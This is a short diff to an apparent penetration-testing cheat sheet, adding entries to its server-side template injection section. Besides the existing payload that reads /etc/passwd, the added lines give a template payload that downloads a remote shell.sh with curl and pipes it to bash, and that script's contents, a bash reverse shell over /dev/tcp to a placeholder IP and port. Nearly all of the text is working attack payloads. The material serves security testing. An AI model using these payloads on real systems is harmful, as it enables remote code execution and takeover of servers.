@@ -287,6 +287,12 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injectio
 ### Server Sided Template Injection
 ```
 {% import os %}{{ os.popen("cat /etc/passwd").read() }}
+
+Thanks to Legacyy for the recommended curl command
+{% import os %}{{ os.popen("curl <IP>/shell.sh | bash").read() }}
+
+Contents of shell.sh 
+bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
 ```
 https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf
 
